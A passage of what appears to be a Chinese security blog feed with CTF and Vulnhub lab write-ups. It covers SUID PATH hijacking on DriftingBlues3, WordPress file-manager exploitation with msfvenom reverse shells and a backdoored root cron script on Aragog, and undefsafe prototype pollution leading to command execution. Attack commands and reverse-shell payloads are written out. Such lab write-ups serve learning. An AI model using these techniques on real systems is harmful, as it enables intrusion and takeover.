class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">robertj@driftingblues:&#x2F;tmp$ find &#x2F; -group operators -perm &#x2F;4000 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;getinfo</span><br></pre></td></tr></table></figure><p>运行该命令，发现得到的是一些服务器的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">robertj@driftingblues:&#x2F;tmp$ getinfo</span><br><span class="line">###################</span><br><span class="line">ip address</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link&#x2F;loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1&#x2F;8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1&#x2F;128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000</span><br><span class="line">    link&#x2F;ether 08:00:27:d6:e5:24 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.56.110&#x2F;24 brd 192.168.56.255 scope global dynamic enp0s3</span><br><span class="line">       valid_lft 561sec preferred_lft 561sec</span><br><span class="line"></span><br><span class="line">bash</span><br><span class="line">    inet6 fe80::a00:27ff:fed6:e524&#x2F;64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">###################</span><br><span class="line">hosts</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">127.0.1.1       driftingblues</span><br><span class="line"></span><br><span class="line">bash</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">###################</span><br><span class="line">os info</span><br><span class="line">###################</span><br><span class="line"></span><br><span class="line">Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>应该是调用了一些linux命令然后输出，查看最后一行可以猜测是运行了uname命令，尝试查看改文件也能够看出一些蛛丝马迹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ip address</span><br><span class="line">###################</span><br><span class="line">ip a###################</span><br><span class="line">hosts</span><br><span class="line">###################</span><br><span class="line">cat &#x2F;etc&#x2F;hosts###################</span><br><span class="line">os info</span><br><span class="line">##################</span><br><span class="line"> uname -a8\�������������T�����</span><br></pre></td></tr></table></figure><p>知道其实是调用了uname命令的话，那么我们可以通过覆盖系统命令路径到我们自己编写命令那么就可以实现提权，在/tmp目录下新建uname文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br></pre></td></tr></table></figure><p>然后修改path变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br></pre></td></tr></table></figure><p>然后执行getinfo即可实现提权</p><p>之前在监控进程时发现一个upit程序，查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@driftingblues:~# crontab -l</span><br><span class="line"># For more information see the manual pages of crontab(5) and cron(8)</span><br><span class="line">#</span><br><span class="line"># m h  dom mon dow   command</span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">* * * * * bash &#x2F;root&#x2F;upit</span><br></pre></td></tr></table></figure><p>可以看到果然存在一个upit的计划任务</p><p>将getinfo文件进行反编译查看一下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setuid(0);</span><br><span class="line">  puts(&quot;###################\nip address\n###################\n&quot;);</span><br><span class="line">  system(&quot;ip a&quot;);</span><br><span class="line">  puts(&quot;###################\nhosts\n###################\n&quot;);</span><br><span class="line">  system(&quot;cat &#x2F;etc&#x2F;hosts&quot;);</span><br><span class="line">  puts(&quot;###################\nos info\n###################\n&quot;);</span><br><span class="line">  system(&quot;uname -a&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完结撒花~</p><p><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" rel="noopener">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2021/06/03/vulnhubDraftingblues3/2.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="vulnhub" scheme="http://chaosec.top/categories/vulnhub/"/>
    
    
      <category term="suid提权" scheme="http://chaosec.top/tags/suid%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub系列-Aragog</title>
    <link href="http://chaosec.top/2021/05/30/vulnhubAragog/"/>
    <id>http://chaosec.top/2021/05/30/vulnhubAragog/</id>
    <published>2021-05-30T00:00:00.000Z</published>
    <updated>2021-05-30T09:22:10.352Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/05/30/vulnhubAragog/2.jpg" alt></p><a id="more"></a><h1 id="Aragog"><a href="#Aragog" class="headerlink" title="Aragog"></a>Aragog</h1><p>经过扫描IP地址为192.168.56.107</p><p>然后进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sT -vv -O 192.168.56.107</span><br></pre></td></tr></table></figure><p>还是开放了80和22端口，那么对80端口进行测试</p><p>下一步进行目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /opt/dirsearch/dirsearch.py -u http://192.168.56.107/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e php,txt,html -f -t 40</span><br></pre></td></tr></table></figure><p>进行爆破之后发现blog目录下存在wordpress博客，在kali下有一个wordpress工具wpscan，使用该工具进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.107/blog/ -t 20 --plugins-detection aggressive</span><br></pre></td></tr></table></figure><p>扫描之后发现存在一个插件</p><p><img src="/2021/05/30/vulnhubAragog/2.png" alt></p><p>版本号为6.0，该插件存在CVE-2020-25213，github上有exp，利用该漏洞可以上传木马到后台getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./wp-file-manager-exploit.sh -u http://192.168.56.107/blog -f /tmp/shell.php</span><br></pre></td></tr></table></figure><p>这里-f参数需要使用绝对目录，否则会上传失败</p><p>之后会返回URL，使用蚁剑连接该URL即可getshell</p><p>查看/home/hagrid98可以得到第一段flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /home/hagrid98/horcrux1.txt</span><br><span class="line">horcrux_&#123;MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==&#125;</span><br></pre></td></tr></table></figure><p>使用msf生成木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.56.108</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>然后我们生成木马上传到目标系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.56.108 LPORT=4444 -f raw &gt; msf.php</span><br></pre></td></tr></table></figure><p>然后kali在kali上执行shell命令即可获得交互式shell</p><p>查看进程发现有mysql进行，在wordpress配置文件中有mysql的用户名和密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/wordpress/config-default.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">define(<span class="string">'DB_NAME'</span>, <span class="string">'wordpress'</span>);</span><br><span class="line">define(<span class="string">'DB_USER'</span>, <span class="string">'root'</span>);</span><br><span class="line">define(<span class="string">'DB_PASSWORD'</span>, <span class="string">'mySecr3tPass'</span>);</span><br><span class="line">define(<span class="string">'DB_HOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line">define(<span class="string">'DB_COLLATE'</span>, <span class="string">'utf8_general_ci'</span>);</span><br><span class="line">define(<span class="string">'WP_CONTENT_DIR'</span>, <span class="string">'/usr/share/wordpress/wp-content'</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>连接mysql，查看是否有密码信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pmySecr3tPass -Dwordpress</span><br><span class="line">select * from wp_users;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/30/vulnhubAragog/3.png" alt></p><p>在kali下使用hachcat时会报错，所以在windows下破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat.exe -O -m 400 -a 0 -o cracked.txt .\hash.txt C:\Users\aesm1p\Desktop\rockyou.txt</span><br></pre></td></tr></table></figure><p>很快就爆破出来了结果为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$P</span><span class="variable">$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc</span>.:password123</span><br></pre></td></tr></table></figure><p>使用账户名密码进行ssh登录，得到第一段flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hagrid98@Aragog:~$ cat horcrux1.txt</span><br><span class="line">horcrux_&#123;MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==&#125;</span><br></pre></td></tr></table></figure><p>在寻找信息之后没有找到合适的信息，有一款工具pspy可以用来监测系统中运行的不需要root权限的进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021/05/29 11:04:01 CMD: UID=0 PID=7682 | /bin/sh -c bash -c <span class="string">"/opt/.backup.sh"</span></span><br></pre></td></tr></table></figure><p>这个进程uid为0，每两分钟运行一次，而且这个文件任意用户均可读写，所以我们在这个文件中写入木马：</p><p>kali中存在webshells，我们将该webshell补全参数后上传，然后监听等待反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><p>编辑靶机上的.backup.sh文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads</span><br><span class="line">php /tmp/php-reverse-shell.php</span><br></pre></td></tr></table></figure><p>然后最多等待两分钟即可在kali上收到反弹的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -lvvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">192.168.56.107: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.108] from (UNKNOWN) [192.168.56.107] 48774</span><br><span class="line">Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux</span><br><span class="line"> 11:26:01 up 17:51,  1 user,  load average: 0.00, 0.02, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">hagrid98 pts/0    192.168.56.108   09:39   17.00s  0.15s  0.15s -bash</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">/bin/sh: 0: can't access tty; job control turned off</span><br><span class="line"><span class="meta">#</span><span class="bash"> id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2021/05/30/vulnhubAragog/2.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="vulnhub" scheme="http://chaosec.top/categories/vulnhub/"/>
    
    
      <category term="wordpress" scheme="http://chaosec.top/tags/wordpress/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF_WEB(四)</title>
    <link href="http://chaosec.top/2020/09/24/buuctf3/"/>
    <id>http://chaosec.top/2020/09/24/buuctf3/</id>
    <published>2020-09-23T16:00:00.000Z</published>
    <updated>2020-09-26T07:15:19.327Z</updated>
    
    <content type="html"><![CDATA[<p>原型链污染学习</p><a id="more"></a><h1 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>undefsafe存在原型链漏洞，CVE编号为CVE-2019-10795，undefsafe是一个简单的函数，能够检索深层对象属性值从而避免出现<code>Cannot read property &#39;X&#39; of undefined</code>错误。例如下列代码段：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj=&#123;</span><br><span class="line">    a:&#123;</span><br><span class="line">        b:&#123;</span><br><span class="line">            c:<span class="number">1</span>,</span><br><span class="line">            d:<span class="string">'aesm1p'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>如果此时我们打印不存在的变量，会导致报错</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(obj.a.b);</span><br><span class="line"><span class="comment">//&#123; c: 1, d: 'aesm1p' &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(obj.a.f);</span><br><span class="line"><span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(obj.e.f);</span><br><span class="line"><span class="comment">//Uncaught TypeError: Cannot read property 'f' of undefined</span></span><br></pre></td></tr></table></figure><p>可以看到，由于访问到了不存在的属性的属性，导致了报错，如果程序运行中遇到这个问题报错终止会很麻烦，而undefsafe模块则可以解决这个问题</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> undef = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(undef(obj,<span class="string">'a.b'</span>));</span><br><span class="line"><span class="comment">//&#123; c: 1, d: 'aesm1p' &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(undef(obj,<span class="string">'a.f'</span>));</span><br><span class="line"><span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(undef(obj,<span class="string">'e.f'</span>));</span><br><span class="line"><span class="comment">//undefined</span></span><br></pre></td></tr></table></figure><p>该函数还能对不存在的属性进行赋值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(obj);</span><br><span class="line"><span class="comment">//&#123; a: &#123; b: &#123; c: 1, d: 'aesm1p' &#125; &#125; &#125;</span></span><br><span class="line"><span class="keyword">var</span> res = undef(obj,<span class="string">'e.f'</span>,<span class="string">'new'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(obj);</span><br><span class="line"><span class="comment">//&#123; a: &#123; b: &#123; c: 1, d: 'aesm1p' &#125; &#125;, f: 'new' &#125;</span></span><br></pre></td></tr></table></figure><p><strong>漏洞细节</strong></p><p>漏洞出现原因在于原型链污染，如下列代码段，a函数会被欺骗通过<code>__proto__</code>来增加或者修改<code>Object.prototype</code>的属性值，例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">"undefsafe"</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">"__proto__.toString"</span>;</span><br><span class="line">a(&#123;&#125;,payload,<span class="string">"JHU"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.toString);</span><br><span class="line"><span class="comment">//JHU</span></span><br></pre></td></tr></table></figure><p>那么回到本题中，用到了<code>undefsafe</code>模块的代码段有两处</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">get_note(id) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">    undefsafe(r, id, undefsafe(<span class="keyword">this</span>.note_list, id));</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">    undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">    undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_note函数传入两个参数，edit_note函数的undefsafe模块存在原型链攻击<br>查看代码，发现status路由存在命令执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;</span><br><span class="line">                shell: <span class="string">'/bin/bash'</span></span><br><span class="line">            &#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">"ok"</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>通过原型链污染，将我们命令注入到commands即可，代码测试:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br><span class="line">note_list=&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> id=<span class="string">'__proto__.aaa'</span>;</span><br><span class="line"><span class="keyword">var</span> author = <span class="string">'aesm1p'</span>;</span><br><span class="line"><span class="keyword">var</span> raw = <span class="string">'test'</span>;</span><br><span class="line">undefsafe(note_list, id+<span class="string">'.author'</span>,author);</span><br><span class="line"><span class="keyword">let</span> commands = &#123;</span><br><span class="line">    <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">    <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line"> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(commands[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//uptime</span></span><br><span class="line"><span class="comment">//free -m</span></span><br><span class="line"><span class="comment">//aesm1p</span></span><br></pre></td></tr></table></figure><p>可以看到我们的输入被成功执行，但是为什么字典遍历会遍历到我们输入的属性呢，这是因为</p><blockquote><p>for…in 循环只遍历可枚举属性（包括它的原型链上的可枚举属性）。像 Array和 Object使用内置构造函数所创建的对象都会继承自Object.prototype和String.prototype的不可枚举属性，例如 String 的 indexOf()  方法或 Object的toString()方法。循环将遍历对象本身的所有可枚举属性，以及对象从其构造函数原型中继承的属性（更接近原型链中对象的属性覆盖原型属性）</p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>攻击过程如下：<br>在buuoj上开启一个靶机，确定IP地址，监听端口用来反弹shell<br>访问edit_note页面，进行原型链污染，写入反弹shell命令<br><img src="/2020/09/24/buuctf3/1.png" alt><br>然后访问status页面触发命令执行<br><img src="/2020/09/24/buuctf3/2.png" alt><br>读取flag即可<br><img src="/2020/09/24/buuctf3/3.png" alt></p><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>既然碰到了原型链的题目，就顺便学习一下原型链的原理</p><h2 id="JavaScript原型链"><a href="#JavaScript原型链" class="headerlink" title="JavaScript原型链"></a>JavaScript原型链</h2><p>既然说到了原型链污染,就势必要弄清楚什么是原型链,在找了很多文章之后,发现阮一峰师傅是讲的最清楚明白的,跟着他的思路来理解什么是原型链。</p><p>JavaScript在创建之初就是作为浏览器的前端语言的,而且是面向对象的一个语言,那么涉及到对象,就势必要有继承机制,种种机缘之下, js作者放弃了在c++或java等语言上使用的类的继承机制,而是自己实现了一种机制来实现继承,这就是原型链。那么具体是怎么做的呢?</p><p>我们先创建一个对象(JS中一切皆对象)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DOG</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.species = <span class="string">'犬科'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> dog1 = <span class="keyword">new</span> DOG(<span class="string">'dog1'</span>);</span><br><span class="line"><span class="keyword">var</span> dog2 = <span class="keyword">new</span> DOG(<span class="string">'dog2'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(dog1.name);</span><br><span class="line"><span class="built_in">console</span>.log(dog2.name);</span><br><span class="line"><span class="comment">//dog1</span></span><br><span class="line"><span class="comment">//dog2</span></span><br></pre></td></tr></table></figure><p>假如此时我们修改dog1的属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dog1.species = <span class="string">'猫科'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(dog1.species);</span><br><span class="line"><span class="built_in">console</span>.log(dog2.species);</span><br><span class="line"><span class="comment">//猫科</span></span><br><span class="line"><span class="comment">//犬科</span></span><br></pre></td></tr></table></figure><p>可以看到,对于dog1的修改没有在dog2中生效,即两个类无法共享数据,这样显然是不合理的,此时我们可以使用原型链来解决这个问题</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DOG</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="comment">//this.species = '犬科';</span></span><br><span class="line">&#125;;</span><br><span class="line">DOG.prototype.species = <span class="string">'犬科'</span>;</span><br><span class="line"><span class="keyword">var</span> dog1 = <span class="keyword">new</span> DOG(<span class="string">'dog1'</span>);</span><br><span class="line"><span class="keyword">var</span> dog2 = <span class="keyword">new</span> DOG(<span class="string">'dog2'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(dog1.species);</span><br><span class="line"><span class="built_in">console</span>.log(dog2.species);</span><br><span class="line">DOG.prototype.species = <span class="string">'猫科'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(dog1.species);</span><br><span class="line"><span class="built_in">console</span>.log(dog2.species);</span><br><span class="line"><span class="comment">//犬科</span></span><br><span class="line"><span class="comment">//犬科</span></span><br><span class="line"><span class="comment">//猫科</span></span><br><span class="line"><span class="comment">//猫科</span></span><br></pre></td></tr></table></figure><p>可以看到使用原型链可以实现数据共享,相当于实现了类的继承,原型链主要是通过<code>prototype</code>属性实现的, 